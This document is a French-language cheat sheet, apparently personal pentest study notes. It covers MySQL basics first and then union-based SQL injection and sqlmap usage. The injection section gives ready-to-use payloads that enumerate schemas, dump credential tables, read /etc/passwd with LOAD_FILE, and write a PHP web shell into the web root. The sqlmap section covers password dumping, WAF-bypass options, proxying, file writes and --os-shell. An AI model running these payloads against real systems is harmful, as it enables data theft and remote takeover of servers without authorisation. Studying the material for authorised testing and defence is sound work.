# MySQL

## Base

```
CREATE DATABASE users;
SHOW DATABASES;

CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );

SHOW TABLES;
DESCRIBE logins;

CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```

## Insert

```
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

## Select

```
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
```

## Alter

```
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
```

## Update

```
UPDATE logins SET password = 'change_password' WHERE id > 1;
```

## Order

```
SELECT * FROM logins ORDER BY password;
SELECT * FROM logins ORDER BY password DESC;
SELECT * FROM logins ORDER BY password DESC, id ASC;
```

## Limite

```
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;
```

## Where

```
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins where username = 'admin';
```

## Like

```
SELECT * FROM logins WHERE username LIKE 'admin%';
SELECT * FROM logins WHERE username like '___';
```

## And - Or - Not

```
SELECT 1 = 1 AND 'test' = 'test';
SELECT 1 = 1 OR 'test' = 'abc';
SELECT NOT 1 = 1;
SELECT 1 = 1 && 'test' = 'abc';
SELECT 1 = 1 || 'test' = 'abc';
SELECT * FROM logins WHERE username != 'john';
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

# Union Base Injection


1. Rechercher une possible erreur SQL avec symboles spéciaux.
2. Connaître le nombre de columne.
```
' order by 2 -- -
# Tester toous les numéros jusqu'à erreur
```
3. On utilise l'union et voit où finissent chaque entrée
```
cn' UNION select 1,2,3,4-- -
```
4. On peut obtenir le numéro de version et d'autres infomrations
```
cn' UNION select 1,@@version,3,4-- -
cn' UNION select 1,user(),3,4-- -
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
cn' UNION select 1,database(),2,3-- -
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
cn' UNION select 1, username, password, 4 from dev.credentials-- -
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - # si colonne vide : écrire/lire tous fichiers
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

# SQLMap

Copy As Curl dans Burp suit.
Pour envoyer une requête complète, enregistrer la requête dans burp
## Basique

```
sqlmap -r req.txt
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap -u www.target.com --data='id=1' --method PUT
sqlmap -u www.target.com --data='id=1' --dump --batch -t /tmp/traffic.txt
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch --proxy
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

## Enumération

```
sqlmap -u http://83.136.254.197:39566/case7.php?id=1 --dump --batch -T flag7 --technique=U --union-cols=5
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname --dump-format HTML
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
sqlmap -u "http://www.example.com/?id=1" --schema
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

## Contournement

```
--csrf-token="csrf-token"
--randomize=rp
--proxy="socks4://177.39.187.70:33283") #tor
--skip-waf
--random-agent
--tamper
```

## Ecrire dans un fichier

```
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" # copier le contenu de shell.php à la destination
sqlmap -u "http://www.example.com/?id=1" --os-shell
```